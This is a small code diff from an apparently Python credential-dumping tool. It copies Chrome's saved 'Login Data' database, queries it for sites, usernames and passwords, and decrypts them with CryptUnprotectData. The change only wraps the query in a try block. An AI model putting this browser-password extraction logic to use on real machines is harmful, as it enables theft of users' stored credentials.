@@ -45,10 +45,10 @@ class decypt():
         db_path = os.path.join(
             constant.profile['LOCALAPPDATA'],u'Google\Chrome\\User Data\Default\Login Data')
         databases = self.copy_db(db_path,tmp + os.sep + self.str_rangdom())
-        conn = sqlite3.connect(databases)
-        cursor = conn.cursor()
-        cursor.execute(self.database_query)
         try:
+            conn = sqlite3.connect(databases)
+            cursor = conn.cursor()
+            cursor.execute(self.database_query)
             for url, login, password in cursor.fetchall():
                 password = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                 if password:
